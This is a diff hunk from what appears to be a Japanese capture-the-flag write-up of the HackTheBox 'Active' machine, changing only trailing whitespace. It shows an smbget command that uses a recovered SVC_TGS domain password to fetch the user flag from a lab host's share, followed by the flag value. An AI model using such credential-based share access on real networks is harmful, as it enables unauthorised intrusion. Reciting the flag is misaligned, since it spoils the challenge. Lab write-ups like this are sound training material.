@@ -248,8 +248,8 @@ Usersフォルダも参照できたため、ユーザフラグゲット！
 ```sh
 └─$ smbget -U active.htb/SVC_TGS%GPPstillStandingStrong2k18 smb://10.129.246.135/Users/SVC_TGS/Desktop/user.txt
 Using domain: ACTIVE.HTB, user: SVC_TGS
-smb://10.129.246.135/Users/SVC_TGS/Desktop/user.txt                                                                                                                                                                                         
-Downloaded 34b in 13 seconds                                                                                                                                                                                                                                    
+smb://10.129.246.135/Users/SVC_TGS/Desktop/user.txt
+Downloaded 34b in 13 seconds
 
 └─$ cat user.txt  
 b603b6e3a31eb7b6e675b760cb537559
